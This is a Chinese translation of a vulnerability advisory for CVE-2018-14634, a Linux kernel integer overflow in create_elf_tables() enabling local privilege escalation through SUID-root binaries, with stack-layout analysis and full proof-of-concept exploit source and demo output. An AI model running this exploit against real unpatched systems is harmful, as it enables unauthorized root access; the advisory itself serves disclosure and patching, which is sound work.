# Linux create_elf_tables函数整数溢出漏洞（CVE-2018-14634）的分析与利用

阅读量 **212853**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-27 14:34:00

 **x**

##### 译文声明

本文是翻译文章，文章来源：seclists.org

原文地址：<https://seclists.org/oss-sec/2018/q3/274>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01006e4c3c1dd86d25.jpg)

## 概述

我们在Linux内核create_elf_tables()函数中发现了一个整数溢出漏洞。因此，本地攻击者可以借助SUID-root二进制文件在64位系统上进行漏洞利用，从而获得完整Root权限。  
该漏洞在Commit b6a2fea39318（2007年7月19日提交，增加可变长度参数支持）中存在，从Commit
da029c11e6b1（2017年7月7日提交，将arg栈限制为_STK_LIM的75以下）版本开始修复。  
后续的大多数Linux发行版本都将da029c11e6b1改动加入了内核之中，然而Red Hat Enterprise
Linux、CentOS以及Debian 8（稳定版）都没有将其更新到发行版本中，因此上述系统仍然存在这一漏洞，并且是实际可以利用的。

## 漏洞分析

    
    
    150 #define STACK_ROUND(sp, items) 
     151         (((unsigned long) (sp - items)) &~ 15UL)
     ...
     165 create_elf_tables(struct linux_binprm *bprm, struct elfhdr *exec,
     ...
     169         int argc = bprm->argc;
     170         int envc = bprm->envc;
     171         elf_addr_t __user *sp;
     ...
     178         int items;
     ...
     190         p = arch_align_stack(p);
     ...
     287         items = (argc + 1) + (envc + 1) + 1;
     288         bprm->p = STACK_ROUND(sp, items);
     ...
     295         sp = (elf_addr_t __user *)bprm->p;
    

其中，参数“argc”表示传递给execve()系统调用的命令行参数的数量，该参数受限于MAX_ARG_STRINGS（位于fs/exec.c中）。参数“envc”表示传递给execve()的环境变量的数量，同样受限于MAX_ARG_STRINGS。但是，由于MAX_ARG_STRINGS是0x7FFFFFFF，因此我们可以使items（位于第287行）整数溢出，并使其为负数。  
这样一来，我们就可以增加userland栈指针，而不是减少其数量（在第288行和第295行，在x86_64上），从而将userland重定向到我们的参数和环境字符串（已经复制到fs/exec.c栈顶）的中间。最终，在用户域执行SUID-root二进制文件时，就将覆盖这些字符。

## 漏洞利用

我们使用execve()执行一个SUID-root二进制文件，其中包含0x80000000的“items”（也就是INT_MIN
“items”）。0x80000000 _sizeof(char_ ) =
16GB参数指针、16GB参数字符串和16GB环境字符串。我们在实现漏洞利用时，实际上只需要2 _16=32GB的内存，而不需要3_
16或者更多。原因在于，我们使用了一些技巧，来减少其内存占用。举例来说，我们将近16GB的相等自变量指针（Equal Argument
Pointer）替换为等效的文件支持的映射，几乎不会消耗任何内存。  
下图展示了当SUID-root二进制文件开始执行时，ld.so中用户空间栈的结构：

    
    
                   | argument strings  |          environment strings          |
    --|---|--------|---------+---------|---------+---------+---------+---------|--      | A | sprand | protect | padding | protect | scratch | onebyte | padding |
    --|---|--------|---------+---------|---------+---------+------^--+---------|--      |     0-8192              ~16GB                1MB         rsp    ~16GB
      v                                               <-------+---|----------|
      |                                                 stack | B | pointers |
      -------------->-------------->-------------->--------------/   16GB
                 0x80000000 * sizeof(elf_addr_t) = 16GB
    

其中：  
“A”（“alpha”）是由create_elf_tables()（位于190-287行）分配的栈空间数量，大约512字节。  
“sprand”是由create_elf_tables()（位于190行）分配的随机栈空间数量，从0字节到8192字节不等。  
“protect”参数字符串是重要命令行参数和选项（例如：argv[0]、SUID-rood二进制文件的文件名），这里的内容必须要防止发生内存损坏。  
“padding”参数字符串占用大约16GB的栈空间。  
“protect”环境字符串是重要的环境变量（例如：LD_PRELOAD环境变量，它由ld.so的handle_ld_preload()函数处理），同样需要防止内存损坏的发生。  
“scratch”环境字符串是用于执行SUID-root二进制文件的1MB安全栈空间。“items”的整数溢出会将userland栈指针“rsp”重定向到我们的参数和环境字符串的中间（也就是偏移量为0x80000000
* sizeof(elf_addr_t) = 16GB的位置）。更准确的说，其实是“onebyte”环境字符串的中间位置。  
“onebyte”环境字符串是256KB单字节（空）环境变量，将会被ld.so的handle_ld_preload()函数中4KB
fname[]缓冲区部分覆盖。  
“padding”环境字符串占用大约16GB的栈空间。  
在“items”发生整数溢出以及用户空间栈指针“rsp”发生重定向之后，16GB的参数和环境指针“pointers”（即argv[]
和envp[]数组）被create_elf_tables()写入到“padding”环境字符串上。  
“B”（“beta”）是在调用handle_ld_preload()之前由ld.so分配的栈空间数量，它大约为9KB，并且是在“onebyte”环境字符串的中间分配。  
因此，ld.so会使用handle_ld_preload()中fname[]缓冲区，对
“onebyte”环境变量中的部分内容进行覆盖（也就是重写）。我们可以通过LD_PRELOAD环境变量来控制fname[]缓冲区中的内容。这样一来，process_envvars()中的过滤UNSECURE_ENVVARS（包括LD_AUDIT、LD_LIBRARY_PATH、LD_PRELOAD等等)就无效了。在实际漏洞利用过程中，不包含ld.so中的UNSECURE_ENVVARS过滤，留给感兴趣的读者练习。  
在我们的PoC中，利用了create_elf_tables()的整数溢出，从而导致ld.so中缺少UNSECURE_ENVVARS过滤。正常情况下，LD_LIBRARY_PATH应该被ld.so从环境变量中删除，而在漏洞利用过程中却没有。PoC在这种情况下，执行SUID-root二进制文件（poc-suidbin.c）的main()。具体的演示如下：

    
    
    # gcc -O0 -o poc-suidbin poc-suidbin.c
    # chown root poc-suidbin
    # chmod 4555 poc-suidbin
    
    $ gcc -o poc-exploit poc-exploit.c
    $ time ./poc-exploit
    ...
    ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: 
    ignored.
    ERROR: ld.so: object 'LD_LIBRARY_PATH=.0LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
    ERROR: ld.so: object 'LD_LIBRARY_PATH=.' from LD_PRELOAD cannot be preloaded: ignored.
    argc 2147090419
    stack 0x7ffbe115008f < 0x7ffbe1150188 < 0x7fffe0e50128 < 0x7ff7e11503ea < 0x7ffbe102cdea
    getenv 0x7ffbe114d83b .
    0x7ffbe114d82b LD_LIBRARY_PATH=.
    0x7ffbe114df60 LD_LIBRARY_PATH=.
    0x7ffbe114df72 LD_LIBRARY_PATH=.
    ...
    0x7ffbe114e69e LD_LIBRARY_PATH=.
    0x7ffbe114e6b0 LD_LIBRARY_PATH=.
    0x7ffbe114e6c2 LD_LIBRARY_PATH=.
    
    real    5m38.666s
    user    0m0.049s
    sys     1m57.828s
    

## PoC

    
    
    /*
     * poc-exploit.c for CVE-2018-14634
     * Copyright (C) 2018 Qualys, Inc.
     *
     * This program is free software: you can redistribute it and/or modify
     * it under the terms of the GNU General Public License as published by
     * the Free Software Foundation, either version 3 of the License, or
     * (at your option) any later version.
     *
     * This program is distributed in the hope that it will be useful,
     * but WITHOUT ANY WARRANTY; without even the implied warranty of
     * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     * GNU General Public License for more details.
     *
     * You should have received a copy of the GNU General Public License
     * along with this program.  If not, see <http://www.gnu.org/licenses/>.
     */
    
    #include <limits.h>
    #include <paths.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/resource.h>
    #include <sys/stat.h>
    #include <sys/time.h>
    #include <sys/types.h>
    #include <unistd.h>
    
    #define MAPCOUNT_ELF_CORE_MARGIN        (5)
    #define DEFAULT_MAX_MAP_COUNT   (USHRT_MAX - MAPCOUNT_ELF_CORE_MARGIN)
    
    #define PAGESZ ((size_t)4096)
    #define MAX_ARG_STRLEN ((size_t)128 << 10)
    #define MAX_ARG_STRINGS ((size_t)0x7FFFFFFF)
    
    #define die() do { 
        fprintf(stderr, "died in %s: %un", __func__, __LINE__); 
        exit(EXIT_FAILURE); 
    } while (0)
    
    int
    main(void)
    {
        if (sizeof(size_t) != sizeof(uint64_t)) die();
        const size_t alpha = 512;
        const size_t sprand = 8192;
        const size_t beta = (size_t)9 << 10;
        const size_t items = (size_t)1 << 31;
        const size_t offset = items * sizeof(uintptr_t);
    
        #define LLP "LD_LIBRARY_PATH=."
        static char preload_env[MAX_ARG_STRLEN];
      {
        char * const sp = stpcpy(preload_env, "LD_PRELOAD=");
        char * cp = preload_env + sizeof(preload_env);
        size_t n;
        for (n = 1; n <= (size_t)(cp - sp) / sizeof(LLP); n++) {
            size_t i;
            for (i = n; i; i--) {
                *--cp = (n == 1) ? '' : (i == n) ? ':' : '0';
                cp -= sizeof(LLP)-1;
                memcpy(cp, LLP, sizeof(LLP)-1);
            }
        }
        memset(sp, ':', (size_t)(cp - sp));
        if (memchr(preload_env, '', sizeof(preload_env)) !=
                        preload_env + sizeof(preload_env)-1) die();
      }
        const char * const protect_envp[] = {
            preload_env,
        };
        const size_t protect_envc = sizeof(protect_envp) / sizeof(protect_envp[0]);
        size_t _protect_envsz = 0;
      {
        size_t i;
        for (i = 0; i < protect_envc; i++) {
            _protect_envsz += strlen(protect_envp[i]) + 1;
        }
      }
        const size_t protect_envsz = _protect_envsz;
    
        const size_t scratch_envsz = (size_t)1 << 20;
        const size_t scratch_envc = scratch_envsz / MAX_ARG_STRLEN;
        if (scratch_envsz % MAX_ARG_STRLEN) die();
        static char scratch_env[MAX_ARG_STRLEN];
        memset(scratch_env, ' ', sizeof(scratch_env)-1);
    
        const size_t onebyte_envsz = (size_t)256 << 10;
        const size_t onebyte_envc = onebyte_envsz / 1;
    
        const size_t padding_envsz = offset + alpha;
        /***/ size_t padding_env_rem = padding_envsz % MAX_ARG_STRLEN;
        const size_t padding_envc = padding_envsz / MAX_ARG_STRLEN + !!padding_env_rem;
        static char padding_env[MAX_ARG_STRLEN];
        memset(padding_env, ' ', sizeof(padding_env)-1);
        static char padding_env1[MAX_ARG_STRLEN];
        if (padding_env_rem) memset(padding_env1, ' ', padding_env_rem-1);
    
        const size_t envc = protect_envc + scratch_envc + onebyte_envc + padding_envc;
        if (envc > MAX_ARG_STRINGS) die();
    
        const size_t argc = items - (1 + 1 + envc + 1);
        if (argc > MAX_ARG_STRINGS) die();
    
        const char * const protect_argv[] = {
            "./poc-suidbin",
        };
        const size_t protect_argc = sizeof(protect_argv) / sizeof(protect_argv[0]);
        if (protect_argc >= argc) die();
        size_t _protect_argsz = 0;
      {
        size_t i;
        for (i = 0; i < protect_argc; i++) {
            _protect_argsz += strlen(protect_argv[i]) + 1;
        }
      }
        const size_t protect_argsz = _protect_argsz;
    
        const size_t padding_argc = argc - protect_argc;
        const size_t padding_argsz = (offset - beta) - (alpha + sprand / 2 +
                       protect_argsz + protect_envsz + scratch_envsz + onebyte_envsz / 2);
        const size_t padding_arg_len = padding_argsz / padding_argc;
        /***/ size_t padding_arg_rem = padding_argsz % padding_argc;
        if (padding_arg_len >= MAX_ARG_STRLEN) die();
        if (padding_arg_len < 1) die();
        static char padding_arg[MAX_ARG_STRLEN];
        memset(padding_arg, ' ', padding_arg_len-1);
        static char padding_arg1[MAX_ARG_STRLEN];
        memset(padding_arg1, ' ', padding_arg_len);
    
        const char ** const envp = calloc(envc + 1, sizeof(char *));
        if (!envp) die();
      {
        size_t envi = 0;
        size_t i;
        for (i = 0; i < protect_envc; i++) {
            envp[envi++] = protect_envp[i];
        }
        for (i = 0; i < scratch_envc; i++) {
            envp[envi++] = scratch_env;
        }
        for (i = 0; i < onebyte_envc; i++) {
            envp[envi++] = "";
        }
        for (i = 0; i < padding_envc; i++) {
            if (padding_env_rem) {
                envp[envi++] = padding_env1;
                padding_env_rem = 0;
            } else {
                envp[envi++] = padding_env;
            }
        }
        if (envi != envc) die();
        if (envp[envc] != NULL) die();
        if (padding_env_rem) die();
      }
    
        const size_t filemap_size = ((padding_argc - padding_arg_rem) * sizeof(char *) / (DEFAULT_MAX_MAP_COUNT / 2) + PAGESZ-1) & ~(PAGESZ-1);
        const size_t filemap_nptr = filemap_size / sizeof(char *);
        char filemap_name[] = _PATH_TMP "argv.XXXXXX";
        const int filemap_fd = mkstemp(filemap_name);
        if (filemap_fd <= -1) die();
        if (unlink(filemap_name)) die();
      {
        size_t i;
        for (i = 0; i < filemap_nptr; i++) {
            const char * const ptr = padding_arg;
            if (write(filemap_fd, &ptr, sizeof(ptr)) != (ssize_t)sizeof(ptr)) die();
        }
      }
      {
        struct stat st;
        if (fstat(filemap_fd, &st)) die();
        if ((size_t)st.st_size != filemap_size) die();
      }
    
        const char ** const argv = mmap(NULL, (argc + 1) * sizeof(char *), PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (argv == MAP_FAILED) die();
        if (protect_argc > PAGESZ / sizeof(char *)) die();
        if (mmap(argv, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argv) die();
      {
        size_t argi = 0;
      {
        size_t i;
        for (i = 0; i < protect_argc; i++) {
            argv[argi++] = protect_argv[i];
        }
      }
      {
        size_t n = padding_argc;
        while (n) {
            void * const argp = &argv[argi];
            if (((uintptr_t)argp & (PAGESZ-1)) == 0) {
                if (padding_arg_rem || n < filemap_nptr) {
                    if (mmap(argp, PAGESZ, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != argp) die();
                } else {
                    if (mmap(argp, filemap_size, PROT_READ, MAP_FIXED | MAP_PRIVATE, filemap_fd, 0) != argp) die();
                    argi += filemap_nptr;
                    n -= filemap_nptr;
                    continue;
                }
            }
            if (padding_arg_rem) {
                argv[argi++] = padding_arg1;
                padding_arg_rem--;
            } else {
                argv[argi++] = padding_arg;
            }
            n--;
        }
      }
        if (argi != argc) die();
        if (argv[argc] != NULL) die();
        if (padding_arg_rem) die();
      }
    
      {
        static const struct rlimit stack_limit = {
            .rlim_cur = RLIM_INFINITY,
            .rlim_max = RLIM_INFINITY,
        };
        if (setrlimit(RLIMIT_STACK, &stack_limit)) die();
      }
        execve(argv[0], (char * const *)argv, (char * const *)envp);
        die();
    }
    

## SUID-root二进制文件

    
    
    /*
     * poc-suidbin.c for CVE-2018-14634
     * Copyright (C) 2018 Qualys, Inc.
     *
     * This program is free software: you can redistribute it and/or modify
     * it under the terms of the GNU General Public License as published by
     * the Free Software Foundation, either version 3 of the License, or
     * (at your option) any later version.
     *
     * This program is distributed in the hope that it will be useful,
     * but WITHOUT ANY WARRANTY; without even the implied warranty of
     * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     * GNU General Public License for more details.
     *
     * You should have received a copy of the GNU General Public License
     * along with this program.  If not, see <http://www.gnu.org/licenses/>.
     */
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    #define die() do { 
        fprintf(stderr, "died in %s: %un", __func__, __LINE__); 
        exit(EXIT_FAILURE); 
    } while (0)
    
    int
    main(const int argc, const char * const * const argv, const char * const * const envp)
    {
        printf("argc %dn", argc);
    
        char stack = '';
        printf("stack %p < %p < %p < %p < %pn", &stack, argv, envp, *argv, *envp);
    
        #define LLP "LD_LIBRARY_PATH"
        const char * const llp = getenv(LLP);
        printf("getenv %p %sn", llp, llp);
    
        const char * const * env;
        for (env = envp; *env; env++) {
            if (!strncmp(*env, LLP, sizeof(LLP)-1)) {
                printf("%p %sn", *env, *env);
            }
        }
        exit(EXIT_SUCCESS);
    }

本文翻译自seclists.org [原文链接](https://seclists.org/oss-sec/2018/q3/274)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **P!chu** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/160762](/post/id/160762)

安全客 - 有思想的安全新媒体

本文转载自: [seclists.org](https://seclists.org/oss-sec/2018/q3/274)

如若转载,请注明出处： <https://seclists.org/oss-sec/2018/q3/274>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [系统安全](/tag/系统安全)

 **+1** __3赞

 __收藏

![](https://p3.ssl.qhimg.com/t01bd1dba67fe13cdc6.png) P!chu

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

